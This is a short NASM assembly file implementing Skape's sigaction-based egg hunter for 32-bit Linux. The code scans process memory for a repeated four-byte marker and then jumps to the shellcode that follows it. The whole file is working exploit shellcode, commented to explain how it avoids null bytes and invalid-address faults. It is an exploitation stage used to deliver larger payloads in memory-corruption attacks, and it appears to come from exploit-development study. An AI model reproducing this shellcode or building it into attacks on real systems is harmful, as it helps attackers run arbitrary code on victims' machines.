; Filename: egghunter.nasm
; Author:  Dave Sully
; Website:  http://suls.co.uk
;
; Purpose: Skapes Sigaction egg hunter shellcode  

global _start			

section .text

_start:

next_page:
	or cx,0xfff		; Set cx to 4095
				; (This is the page size in linux however;
				; 4096 = 0x1000 in hex which contains nulls

next_address:
	inc ecx			; Increment ecx
	jnz not_null		; Work around seg fault at address 0x00000000
	inc ecx			; Increment ecx

not_null:
	push byte +0x43		; Push 67 to stack 
	pop eax			; Pop 67 to eax 
	int 0x80 		; System Call (Sigaction, eax = 67, ebx=0, ecx = memory we are testing) 
	cmp al,0xf2		; Compare the return value, 0xf2 = Efault therefore an invalid pointer 
	jz next_page		; Loop if we get an Efault
	mov eax, 0x73756c73	; Move egg to eax (egg = suls) 
	mov edi,ecx		; Move address we are validating to edi
	scasd			; Compare eax/edi and increment edi by 4 btyes 
	jnz next_address	; If not found jump to next address
	scasd			; Compare eax/edi for second egg
	jnz next_address	; If not found jump to next address
	jmp edi			; Egg found so jmp to our shell code 


